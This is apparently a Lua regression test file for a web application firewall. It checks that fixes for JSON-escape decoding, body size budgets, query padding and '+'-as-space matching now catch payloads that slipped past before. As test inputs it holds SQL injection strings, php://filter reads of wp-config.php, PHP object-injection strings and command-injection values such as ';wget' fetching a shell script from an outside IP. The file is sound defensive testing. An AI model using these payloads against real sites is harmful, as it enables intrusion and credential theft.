-- Gaps in the WAF's scan surfaces (edge Lua sweep 2026-10-09, PR 4b). Each
-- let a payload the rule looks for reach the app unseen:
--   * a JSON body's \u00XX escapes were scanned raw: `1' OR '1'='1`
--     is a quote-tautology to the app (json_decode) and nothing to rule 301;
--   * application/vnd.api+json, text/json, application/soap+xml … got the 2 KB
--     "other" body budget, so a payload past 2 KB went unscanned;
--   * on a GET (no Content-Type) the query side of the shared args+body surface
--     was capped at 2 KB: 2 KB of padding hid php:// (305) and O:N:"…" (329)
--     from every rule reading it, and 306 read a 2 KB query only;
--   * rule 320 matched `;wget ` / `;curl ` / `|sh ` with a space only, and in a
--     query string the space is `+`.
-- (The RCE-marker rules 322-327 still read a form-encoded body raw, on
-- purpose: decoding it would challenge — and, for a cleared admin, block and
-- autoblock — classic-editor posts that mention `crontab -e`.)

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}
package.path = "configs/lua/?.lua;" .. package.path
local waf  = require("cfm_waf")
local util = require("cfm_waf_util")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " ..
           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
local function run(t)
  local hit, reason, _, action, hits = waf.check({
    uri = t.uri or "/api/item", args = t.args or "", raw_uri = (t.uri or "/api/item") .. "?" .. (t.args or ""),
    method = t.method or "POST", ip = "203.0.113.7", body = t.body or "",
    headers = { ["user-agent"] = UA, accept = "text/html", ["accept-language"] = "en",
                ["sec-fetch-mode"] = "navigate", ["content-type"] = t.ct },
  })
  local ids = {}
  for _, h in ipairs(hits or {}) do ids[#ids + 1] = tostring(h.waf_rule_id) end
  return { hit = hit, reason = tostring(reason), action = action, ids = "," .. table.concat(ids, ",") .. "," }
end
local function show(r) return r.reason .. "/" .. tostring(r.action) .. " ids=" .. r.ids end
local PAD = ("a"):rep(2100)

-- ── Positives: each was missed before ──────────────────────────────────────
do
  local r = run{ ct = "application/json", body = '{"id":"1\\u0027 OR \\u00271\\u0027=\\u00271"}' }
  check(r.reason:find("^WAF_SQLI") and r.action == "block", "JSON \\u0027 tautology → SQLi block (" .. show(r) .. ")")
  r = run{ ct = "text/plain", body = '{"id":"1\\u0027 OR \\u00271\\u0027=\\u00271"}' }
  check(r.reason:find("^WAF_SQLI"), "JSON-shaped body under another Content-Type: decoded too (" .. show(r) .. ")")
  r = run{ ct = "application/json", body = '{"f":"php:\\/\\/filter\\/resource=wp-config.php"}' }
  check(r.reason:find("^WAF_PHP_WRAPPER"), "JSON \\/ escapes decoded: php:\\/\\/ → 305 (" .. show(r) .. ")")
  r = run{ ct = "application/vnd.api+json",
           body = '{"pad":"' .. PAD .. '","f":"php://filter/convert.base64-encode/resource=wp-config.php"}' }
  check(r.reason:find("^WAF_PHP_WRAPPER"), "+json body past 2 KB → 305 (" .. show(r) .. ")")
  r = run{ method = "GET", args = "pad=" .. PAD .. "&f=php://filter/resource=wp-config.php" }
  check(r.reason:find("^WAF_PHP_WRAPPER") and r.action == "block", "GET, 2 KB query pad, php:// → 305 (" .. show(r) .. ")")
  r = run{ method = "GET", args = "pad=" .. PAD .. '&d=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' }
  check(r.ids:find(",329,", 1, true), "GET, 2 KB query pad, O:8:… → 329 (" .. show(r) .. ")")
  r = run{ ct = "application/json", body = '{"id":"1\\tunion\\tselect user_pass from wp_users"}' }
  check(r.reason:find("^WAF_SQLI"), "JSON \\t between SQL words decoded → SQLi (" .. show(r) .. ")")
  r = run{ method = "GET", args = "x=1;wget+http://198.51.100.4/x.sh" }
  check(r.ids:find(",320,", 1, true) and r.action == "block", "GET ;wget+ → 320 block (" .. show(r) .. ")")
  r = run{ method = "GET", args = "a=x|sh+-c+id" }
  check(r.ids:find(",320,", 1, true), "GET |sh+ → 320, as |sh%20 already was (" .. show(r) .. ")")
end

-- Rule 306 (serialize markers) reads the query to the request-line budget too.
-- 329 catches the same payloads first; switched off here to reach 306.
do
  waf.set_rule("rule_php_object_injection", "disabled")
  local r = run{ method = "GET", args = "pad=" .. PAD .. '&d=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' }
  check(r.ids:find(",306,", 1, true), "GET, 2 KB query pad, O:8:… → 306 (" .. show(r) .. ")")
  waf.set_rule("rule_php_object_injection", "block")
end

-- ── Negatives: legit traffic stays clean ───────────────────────────────────
do
  local clean = {
    { ct = "application/json", body = '{"title":"Caf\\u00e9 \\u2014 it\'s open","url":"https:\\/\\/example.com\\/a\\/b"}' },
    { ct = "application/json", body = '{"content":"\\u003cp class=\\u0022x\\u0022\\u003eHello\\u003c\\/p\\u003e"}' },
    { ct = "application/json", body = '{"q":"don\\u0027t stop, won\\u0027t stop"}' },
    { ct = "application/x-www-form-urlencoded", body = "name=John+Smith&msg=I+use+bash+and+curl+daily" },
    { ct = "application/vnd.api+json", body = '{"data":{"type":"articles","attributes":{"title":"' .. PAD .. '"}}}' },
    { method = "GET", args = "q=install+wget+on+ubuntu&page=2" },
    { method = "GET", args = "cat=a|shop+now&x=hair+curly+styles" },
    -- Gutenberg serialises block attributes with \u0027 / \u002d\u002d, which
    -- reach a REST JSON body as \\u0027: the text, never a quote or `--`.
    { ct = "application/json", body = '{"content":"<!-- wp:x {\\"t\\":\\"it\\\\u0027s \\\\u002d\\\\u002d 1 OR 2\\"} /-->"}' },
    -- An office document (vnd.openxmlformats-…) is a zip: the 2 KB budget, not XML's.
    { ct = "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body = "PK\3\4" .. ("x"):rep(100) },
  }
  for i, t in ipairs(clean) do
    local r = run(t)
    check(not r.hit, "legit request " .. i .. " stays clean (" .. show(r) .. ")")
  end
end

-- ── Helpers ─────────────────────────────────────────────────────────────────
do
  local j = util.json_unescape_ascii
  check(j('a\\u0027b') == "a'b", "\\u0027 → '")
  check(j('\\u003C\\u003e') == "<>", "either hex case")
  check(j('\\u00e9') == '\\u00e9', "non-ASCII escapes left as is")
  check(j('a\\/b') == "a/b", "\\/ → /")
  check(j("plain") == "plain", "no backslash: unchanged")
  local bb = util.body_budget
  local json = bb({ ["content-type"] = "application/json" })
  check(bb({ ["content-type"] = "application/vnd.api+json" }) == json, "+json gets the JSON budget")
  check(bb({ ["content-type"] = "text/json; charset=utf-8" }) == json, "text/json gets the JSON budget")
  local xml = bb({ ["content-type"] = "application/xml" })
  check(bb({ ["content-type"] = "application/soap+xml" }) == xml, "+xml gets the XML budget")
  check(bb({ ["content-type"] = "multipart/form-data; boundary=json" }) == bb({ ["content-type"] = "multipart/form-data" }),
        "multipart is matched before a `json` in its boundary")
  check(bb({ ["content-type"] = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }) ==
        bb({ ["content-type"] = "application/octet-stream" }), "an office document keeps the 2 KB budget")
  check(j('a\\\\u0027b') == 'a\\\\u0027b', "an escaped backslash is one unit: \\\\u0027 stays text")
  check(j('a\\tb\\nc') == "a\tb\nc", "\\t / \\n decoded")
  check(j('a\\U0027b') == 'a\\U0027b', "only a lowercase \\u is an escape")
end

-- An operator's cfm_waf_config.lua setting uri_scan_len to a string must not
-- make check() raise (cfm.lua would fail open on every such request): loaded
-- the real way, through a fresh cfm_waf (last: it re-initialises the util).
do
  package.loaded["cfm_waf"] = nil
  package.loaded["cfm_waf_config"] = { uri_scan_len = "8192" }
  local waf2 = require("cfm_waf")
  check(waf2.get_config().uri_scan_len == "8192", "the override is in effect (fixture sanity)")
  local ok, hit, reason = pcall(waf2.check, { uri = "/x", args = ("a"):rep(3000) .. "&f=php://filter/x", method = "GET",
                                ip = "203.0.113.7", headers = { ["user-agent"] = UA }, body = "" })
  check(ok, "a string uri_scan_len does not make check() raise (" .. tostring(hit) .. ")")
  check(ok and tostring(reason):find("^WAF_PHP_WRAPPER"), "and the padded php:// is still caught (" .. tostring(reason) .. ")")
  package.loaded["cfm_waf_config"] = nil
end

if fails > 0 then
  io.stderr:write(("cfm_waf scan-surface tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf scan surfaces (JSON escapes, +json budget, query pad, + as space)")
